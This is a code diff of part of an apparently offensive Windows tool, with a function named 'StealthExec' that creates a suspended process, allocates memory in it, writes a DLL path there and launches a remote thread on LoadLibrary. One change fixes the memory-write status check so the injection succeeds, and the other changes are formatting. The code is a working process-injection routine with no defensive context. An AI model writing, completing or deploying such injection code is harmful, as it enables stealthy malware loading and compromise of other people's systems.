@@ -31,8 +31,6 @@ void StealthExec(HANDLE hProc, const char *dllN)
         printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
         return;
     }
-    
-    
 
     if (memLoc == NULL)
     {
@@ -46,7 +44,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
 
     // Write DLL Path to Remote Process
     status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
-    if (status != 1)
+    if (status != 0)
     {
         printf("[!] Memory write failed (Err: 0x%lX).\n", status);
         return;
@@ -55,7 +53,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
     {
         printf("[*] Successfully write memory.\n");
     }
-    
+
     // Load Remote DLL
     hThreadRemote = CreateRemoteThreadEx(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL, NULL);
     if (!hThreadRemote)
@@ -64,12 +62,15 @@ void StealthExec(HANDLE hProc, const char *dllN)
         return;
     }
 
-    DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000);  // Wait for 5 seconds
-    if (waitResult == WAIT_TIMEOUT) {
+    DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000); // Wait for 5 seconds
+    if (waitResult == WAIT_TIMEOUT)
+    {
         printf("[!] Remote thread timed out!\n");
-        TerminateThread(hThreadRemote, 0);  // Kill stuck thread
+        TerminateThread(hThreadRemote, 0); // Kill stuck thread
         return;
-    } else if (waitResult == WAIT_FAILED) {
+    }
+    else if (waitResult == WAIT_FAILED)
+    {
         printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
         CloseHandle(hThreadRemote);
         return;
@@ -112,7 +113,7 @@ int main(int argc, char *argv[])
         printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
         return -1;
     }
-    
+
     printf("[*] Suspended %s created.\n", procName);
 
     // Perform Injection
